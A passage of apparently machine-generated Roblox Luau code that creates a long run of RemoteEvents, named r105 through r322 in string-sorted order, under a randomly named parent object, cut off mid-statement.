local r105 = Instance.new("RemoteEvent")
r105.Name = "r105"
r105.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r106 = Instance.new("RemoteEvent")
r106.Name = "r106"
r106.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r107 = Instance.new("RemoteEvent")
r107.Name = "r107"
r107.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r108 = Instance.new("RemoteEvent")
r108.Name = "r108"
r108.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r109 = Instance.new("RemoteEvent")
r109.Name = "r109"
r109.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r11 = Instance.new("RemoteEvent")
r11.Name = "r11"
r11.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r110 = Instance.new("RemoteEvent")
r110.Name = "r110"
r110.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r111 = Instance.new("RemoteEvent")
r111.Name = "r111"
r111.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r112 = Instance.new("RemoteEvent")
r112.Name = "r112"
r112.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r113 = Instance.new("RemoteEvent")
r113.Name = "r113"
r113.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r114 = Instance.new("RemoteEvent")
r114.Name = "r114"
r114.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r115 = Instance.new("RemoteEvent")
r115.Name = "r115"
r115.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r116 = Instance.new("RemoteEvent")
r116.Name = "r116"
r116.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r117 = Instance.new("RemoteEvent")
r117.Name = "r117"
r117.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r118 = Instance.new("RemoteEvent")
r118.Name = "r118"
r118.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r119 = Instance.new("RemoteEvent")
r119.Name = "r119"
r119.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r12 = Instance.new("RemoteEvent")
r12.Name = "r12"
r12.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r120 = Instance.new("RemoteEvent")
r120.Name = "r120"
r120.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r121 = Instance.new("RemoteEvent")
r121.Name = "r121"
r121.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r122 = Instance.new("RemoteEvent")
r122.Name = "r122"
r122.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r123 = Instance.new("RemoteEvent")
r123.Name = "r123"
r123.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r124 = Instance.new("RemoteEvent")
r124.Name = "r124"
r124.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r125 = Instance.new("RemoteEvent")
r125.Name = "r125"
r125.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r126 = Instance.new("RemoteEvent")
r126.Name = "r126"
r126.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r127 = Instance.new("RemoteEvent")
r127.Name = "r127"
r127.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r128 = Instance.new("RemoteEvent")
r128.Name = "r128"
r128.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r129 = Instance.new("RemoteEvent")
r129.Name = "r129"
r129.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r13 = Instance.new("RemoteEvent")
r13.Name = "r13"
r13.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r130 = Instance.new("RemoteEvent")
r130.Name = "r130"
r130.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r131 = Instance.new("RemoteEvent")
r131.Name = "r131"
r131.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r132 = Instance.new("RemoteEvent")
r132.Name = "r132"
r132.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r133 = Instance.new("RemoteEvent")
r133.Name = "r133"
r133.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r134 = Instance.new("RemoteEvent")
r134.Name = "r134"
r134.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r135 = Instance.new("RemoteEvent")
r135.Name = "r135"
r135.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r136 = Instance.new("RemoteEvent")
r136.Name = "r136"
r136.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r137 = Instance.new("RemoteEvent")
r137.Name = "r137"
r137.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r138 = Instance.new("RemoteEvent")
r138.Name = "r138"
r138.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r139 = Instance.new("RemoteEvent")
r139.Name = "r139"
r139.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r14 = Instance.new("RemoteEvent")
r14.Name = "r14"
r14.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r140 = Instance.new("RemoteEvent")
r140.Name = "r140"
r140.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r141 = Instance.new("RemoteEvent")
r141.Name = "r141"
r141.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r142 = Instance.new("RemoteEvent")
r142.Name = "r142"
r142.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r143 = Instance.new("RemoteEvent")
r143.Name = "r143"
r143.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r144 = Instance.new("RemoteEvent")
r144.Name = "r144"
r144.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r145 = Instance.new("RemoteEvent")
r145.Name = "r145"
r145.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r146 = Instance.new("RemoteEvent")
r146.Name = "r146"
r146.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r147 = Instance.new("RemoteEvent")
r147.Name = "r147"
r147.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r148 = Instance.new("RemoteEvent")
r148.Name = "r148"
r148.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r149 = Instance.new("RemoteEvent")
r149.Name = "r149"
r149.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r15 = Instance.new("RemoteEvent")
r15.Name = "r15"
r15.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r150 = Instance.new("RemoteEvent")
r150.Name = "r150"
r150.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r151 = Instance.new("RemoteEvent")
r151.Name = "r151"
r151.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r152 = Instance.new("RemoteEvent")
r152.Name = "r152"
r152.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r153 = Instance.new("RemoteEvent")
r153.Name = "r153"
r153.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r154 = Instance.new("RemoteEvent")
r154.Name = "r154"
r154.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r155 = Instance.new("RemoteEvent")
r155.Name = "r155"
r155.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r156 = Instance.new("RemoteEvent")
r156.Name = "r156"
r156.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r157 = Instance.new("RemoteEvent")
r157.Name = "r157"
r157.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r158 = Instance.new("RemoteEvent")
r158.Name = "r158"
r158.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r159 = Instance.new("RemoteEvent")
r159.Name = "r159"
r159.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r16 = Instance.new("RemoteEvent")
r16.Name = "r16"
r16.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r160 = Instance.new("RemoteEvent")
r160.Name = "r160"
r160.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r161 = Instance.new("RemoteEvent")
r161.Name = "r161"
r161.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r162 = Instance.new("RemoteEvent")
r162.Name = "r162"
r162.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r163 = Instance.new("RemoteEvent")
r163.Name = "r163"
r163.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r164 = Instance.new("RemoteEvent")
r164.Name = "r164"
r164.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r165 = Instance.new("RemoteEvent")
r165.Name = "r165"
r165.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r166 = Instance.new("RemoteEvent")
r166.Name = "r166"
r166.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r167 = Instance.new("RemoteEvent")
r167.Name = "r167"
r167.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r168 = Instance.new("RemoteEvent")
r168.Name = "r168"
r168.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r169 = Instance.new("RemoteEvent")
r169.Name = "r169"
r169.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r17 = Instance.new("RemoteEvent")
r17.Name = "r17"
r17.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r170 = Instance.new("RemoteEvent")
r170.Name = "r170"
r170.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r171 = Instance.new("RemoteEvent")
r171.Name = "r171"
r171.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r172 = Instance.new("RemoteEvent")
r172.Name = "r172"
r172.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r173 = Instance.new("RemoteEvent")
r173.Name = "r173"
r173.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r174 = Instance.new("RemoteEvent")
r174.Name = "r174"
r174.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r175 = Instance.new("RemoteEvent")
r175.Name = "r175"
r175.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r176 = Instance.new("RemoteEvent")
r176.Name = "r176"
r176.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r177 = Instance.new("RemoteEvent")
r177.Name = "r177"
r177.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r178 = Instance.new("RemoteEvent")
r178.Name = "r178"
r178.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r179 = Instance.new("RemoteEvent")
r179.Name = "r179"
r179.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r18 = Instance.new("RemoteEvent")
r18.Name = "r18"
r18.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r180 = Instance.new("RemoteEvent")
r180.Name = "r180"
r180.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r181 = Instance.new("RemoteEvent")
r181.Name = "r181"
r181.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r182 = Instance.new("RemoteEvent")
r182.Name = "r182"
r182.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r183 = Instance.new("RemoteEvent")
r183.Name = "r183"
r183.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r184 = Instance.new("RemoteEvent")
r184.Name = "r184"
r184.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r185 = Instance.new("RemoteEvent")
r185.Name = "r185"
r185.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r186 = Instance.new("RemoteEvent")
r186.Name = "r186"
r186.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r187 = Instance.new("RemoteEvent")
r187.Name = "r187"
r187.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r188 = Instance.new("RemoteEvent")
r188.Name = "r188"
r188.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r189 = Instance.new("RemoteEvent")
r189.Name = "r189"
r189.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r19 = Instance.new("RemoteEvent")
r19.Name = "r19"
r19.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r190 = Instance.new("RemoteEvent")
r190.Name = "r190"
r190.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r191 = Instance.new("RemoteEvent")
r191.Name = "r191"
r191.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r192 = Instance.new("RemoteEvent")
r192.Name = "r192"
r192.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r193 = Instance.new("RemoteEvent")
r193.Name = "r193"
r193.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r194 = Instance.new("RemoteEvent")
r194.Name = "r194"
r194.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r195 = Instance.new("RemoteEvent")
r195.Name = "r195"
r195.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r196 = Instance.new("RemoteEvent")
r196.Name = "r196"
r196.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r197 = Instance.new("RemoteEvent")
r197.Name = "r197"
r197.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r198 = Instance.new("RemoteEvent")
r198.Name = "r198"
r198.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r199 = Instance.new("RemoteEvent")
r199.Name = "r199"
r199.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r2 = Instance.new("RemoteEvent")
r2.Name = "r2"
r2.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r20 = Instance.new("RemoteEvent")
r20.Name = "r20"
r20.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r200 = Instance.new("RemoteEvent")
r200.Name = "r200"
r200.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r201 = Instance.new("RemoteEvent")
r201.Name = "r201"
r201.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r202 = Instance.new("RemoteEvent")
r202.Name = "r202"
r202.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r203 = Instance.new("RemoteEvent")
r203.Name = "r203"
r203.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r204 = Instance.new("RemoteEvent")
r204.Name = "r204"
r204.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r205 = Instance.new("RemoteEvent")
r205.Name = "r205"
r205.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r206 = Instance.new("RemoteEvent")
r206.Name = "r206"
r206.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r207 = Instance.new("RemoteEvent")
r207.Name = "r207"
r207.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r208 = Instance.new("RemoteEvent")
r208.Name = "r208"
r208.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r209 = Instance.new("RemoteEvent")
r209.Name = "r209"
r209.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r21 = Instance.new("RemoteEvent")
r21.Name = "r21"
r21.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r210 = Instance.new("RemoteEvent")
r210.Name = "r210"
r210.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r211 = Instance.new("RemoteEvent")
r211.Name = "r211"
r211.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r212 = Instance.new("RemoteEvent")
r212.Name = "r212"
r212.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r213 = Instance.new("RemoteEvent")
r213.Name = "r213"
r213.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r214 = Instance.new("RemoteEvent")
r214.Name = "r214"
r214.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r215 = Instance.new("RemoteEvent")
r215.Name = "r215"
r215.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r216 = Instance.new("RemoteEvent")
r216.Name = "r216"
r216.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r217 = Instance.new("RemoteEvent")
r217.Name = "r217"
r217.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r218 = Instance.new("RemoteEvent")
r218.Name = "r218"
r218.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r219 = Instance.new("RemoteEvent")
r219.Name = "r219"
r219.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r22 = Instance.new("RemoteEvent")
r22.Name = "r22"
r22.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r220 = Instance.new("RemoteEvent")
r220.Name = "r220"
r220.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r221 = Instance.new("RemoteEvent")
r221.Name = "r221"
r221.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r222 = Instance.new("RemoteEvent")
r222.Name = "r222"
r222.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r223 = Instance.new("RemoteEvent")
r223.Name = "r223"
r223.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r224 = Instance.new("RemoteEvent")
r224.Name = "r224"
r224.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r225 = Instance.new("RemoteEvent")
r225.Name = "r225"
r225.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r226 = Instance.new("RemoteEvent")
r226.Name = "r226"
r226.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r227 = Instance.new("RemoteEvent")
r227.Name = "r227"
r227.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r228 = Instance.new("RemoteEvent")
r228.Name = "r228"
r228.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r229 = Instance.new("RemoteEvent")
r229.Name = "r229"
r229.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r23 = Instance.new("RemoteEvent")
r23.Name = "r23"
r23.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r230 = Instance.new("RemoteEvent")
r230.Name = "r230"
r230.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r231 = Instance.new("RemoteEvent")
r231.Name = "r231"
r231.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r232 = Instance.new("RemoteEvent")
r232.Name = "r232"
r232.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r233 = Instance.new("RemoteEvent")
r233.Name = "r233"
r233.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r234 = Instance.new("RemoteEvent")
r234.Name = "r234"
r234.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r235 = Instance.new("RemoteEvent")
r235.Name = "r235"
r235.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r236 = Instance.new("RemoteEvent")
r236.Name = "r236"
r236.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r237 = Instance.new("RemoteEvent")
r237.Name = "r237"
r237.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r238 = Instance.new("RemoteEvent")
r238.Name = "r238"
r238.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r239 = Instance.new("RemoteEvent")
r239.Name = "r239"
r239.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r24 = Instance.new("RemoteEvent")
r24.Name = "r24"
r24.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r240 = Instance.new("RemoteEvent")
r240.Name = "r240"
r240.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r241 = Instance.new("RemoteEvent")
r241.Name = "r241"
r241.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r242 = Instance.new("RemoteEvent")
r242.Name = "r242"
r242.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r243 = Instance.new("RemoteEvent")
r243.Name = "r243"
r243.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r244 = Instance.new("RemoteEvent")
r244.Name = "r244"
r244.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r245 = Instance.new("RemoteEvent")
r245.Name = "r245"
r245.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r246 = Instance.new("RemoteEvent")
r246.Name = "r246"
r246.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r247 = Instance.new("RemoteEvent")
r247.Name = "r247"
r247.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r248 = Instance.new("RemoteEvent")
r248.Name = "r248"
r248.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r249 = Instance.new("RemoteEvent")
r249.Name = "r249"
r249.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r25 = Instance.new("RemoteEvent")
r25.Name = "r25"
r25.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r250 = Instance.new("RemoteEvent")
r250.Name = "r250"
r250.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r251 = Instance.new("RemoteEvent")
r251.Name = "r251"
r251.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r252 = Instance.new("RemoteEvent")
r252.Name = "r252"
r252.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r253 = Instance.new("RemoteEvent")
r253.Name = "r253"
r253.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r254 = Instance.new("RemoteEvent")
r254.Name = "r254"
r254.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r255 = Instance.new("RemoteEvent")
r255.Name = "r255"
r255.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r256 = Instance.new("RemoteEvent")
r256.Name = "r256"
r256.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r257 = Instance.new("RemoteEvent")
r257.Name = "r257"
r257.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r258 = Instance.new("RemoteEvent")
r258.Name = "r258"
r258.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r259 = Instance.new("RemoteEvent")
r259.Name = "r259"
r259.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r26 = Instance.new("RemoteEvent")
r26.Name = "r26"
r26.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r260 = Instance.new("RemoteEvent")
r260.Name = "r260"
r260.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r261 = Instance.new("RemoteEvent")
r261.Name = "r261"
r261.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r262 = Instance.new("RemoteEvent")
r262.Name = "r262"
r262.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r263 = Instance.new("RemoteEvent")
r263.Name = "r263"
r263.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r264 = Instance.new("RemoteEvent")
r264.Name = "r264"
r264.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r265 = Instance.new("RemoteEvent")
r265.Name = "r265"
r265.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r266 = Instance.new("RemoteEvent")
r266.Name = "r266"
r266.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r267 = Instance.new("RemoteEvent")
r267.Name = "r267"
r267.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r268 = Instance.new("RemoteEvent")
r268.Name = "r268"
r268.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r269 = Instance.new("RemoteEvent")
r269.Name = "r269"
r269.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r27 = Instance.new("RemoteEvent")
r27.Name = "r27"
r27.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r270 = Instance.new("RemoteEvent")
r270.Name = "r270"
r270.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r271 = Instance.new("RemoteEvent")
r271.Name = "r271"
r271.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r272 = Instance.new("RemoteEvent")
r272.Name = "r272"
r272.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r273 = Instance.new("RemoteEvent")
r273.Name = "r273"
r273.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r274 = Instance.new("RemoteEvent")
r274.Name = "r274"
r274.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r275 = Instance.new("RemoteEvent")
r275.Name = "r275"
r275.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r276 = Instance.new("RemoteEvent")
r276.Name = "r276"
r276.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r277 = Instance.new("RemoteEvent")
r277.Name = "r277"
r277.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r278 = Instance.new("RemoteEvent")
r278.Name = "r278"
r278.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r279 = Instance.new("RemoteEvent")
r279.Name = "r279"
r279.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r28 = Instance.new("RemoteEvent")
r28.Name = "r28"
r28.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r280 = Instance.new("RemoteEvent")
r280.Name = "r280"
r280.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r281 = Instance.new("RemoteEvent")
r281.Name = "r281"
r281.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r282 = Instance.new("RemoteEvent")
r282.Name = "r282"
r282.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r283 = Instance.new("RemoteEvent")
r283.Name = "r283"
r283.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r284 = Instance.new("RemoteEvent")
r284.Name = "r284"
r284.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r285 = Instance.new("RemoteEvent")
r285.Name = "r285"
r285.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r286 = Instance.new("RemoteEvent")
r286.Name = "r286"
r286.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r287 = Instance.new("RemoteEvent")
r287.Name = "r287"
r287.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r288 = Instance.new("RemoteEvent")
r288.Name = "r288"
r288.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r289 = Instance.new("RemoteEvent")
r289.Name = "r289"
r289.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r29 = Instance.new("RemoteEvent")
r29.Name = "r29"
r29.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r290 = Instance.new("RemoteEvent")
r290.Name = "r290"
r290.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r291 = Instance.new("RemoteEvent")
r291.Name = "r291"
r291.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r292 = Instance.new("RemoteEvent")
r292.Name = "r292"
r292.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r293 = Instance.new("RemoteEvent")
r293.Name = "r293"
r293.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r294 = Instance.new("RemoteEvent")
r294.Name = "r294"
r294.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r295 = Instance.new("RemoteEvent")
r295.Name = "r295"
r295.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r296 = Instance.new("RemoteEvent")
r296.Name = "r296"
r296.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r297 = Instance.new("RemoteEvent")
r297.Name = "r297"
r297.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r298 = Instance.new("RemoteEvent")
r298.Name = "r298"
r298.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r299 = Instance.new("RemoteEvent")
r299.Name = "r299"
r299.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r3 = Instance.new("RemoteEvent")
r3.Name = "r3"
r3.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r30 = Instance.new("RemoteEvent")
r30.Name = "r30"
r30.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r300 = Instance.new("RemoteEvent")
r300.Name = "r300"
r300.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r301 = Instance.new("RemoteEvent")
r301.Name = "r301"
r301.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r302 = Instance.new("RemoteEvent")
r302.Name = "r302"
r302.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r303 = Instance.new("RemoteEvent")
r303.Name = "r303"
r303.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r304 = Instance.new("RemoteEvent")
r304.Name = "r304"
r304.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r305 = Instance.new("RemoteEvent")
r305.Name = "r305"
r305.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r306 = Instance.new("RemoteEvent")
r306.Name = "r306"
r306.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r307 = Instance.new("RemoteEvent")
r307.Name = "r307"
r307.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r308 = Instance.new("RemoteEvent")
r308.Name = "r308"
r308.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r309 = Instance.new("RemoteEvent")
r309.Name = "r309"
r309.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r31 = Instance.new("RemoteEvent")
r31.Name = "r31"
r31.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r310 = Instance.new("RemoteEvent")
r310.Name = "r310"
r310.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r311 = Instance.new("RemoteEvent")
r311.Name = "r311"
r311.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r312 = Instance.new("RemoteEvent")
r312.Name = "r312"
r312.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r313 = Instance.new("RemoteEvent")
r313.Name = "r313"
r313.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r314 = Instance.new("RemoteEvent")
r314.Name = "r314"
r314.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r315 = Instance.new("RemoteEvent")
r315.Name = "r315"
r315.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r316 = Instance.new("RemoteEvent")
r316.Name = "r316"
r316.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r317 = Instance.new("RemoteEvent")
r317.Name = "r317"
r317.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r318 = Instance.new("RemoteEvent")
r318.Name = "r318"
r318.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r319 = Instance.new("RemoteEvent")
r319.Name = "r319"
r319.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r32 = Instance.new("RemoteEvent")
r32.Name = "r32"
r32.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r320 = Instance.new("RemoteEvent")
r320.Name = "r320"
r320.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r321 = Instance.new("RemoteEvent")
r321.Name = "r321"
r321.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r322 = Instance.new("RemoteEvent")
r322.Name = "r322"
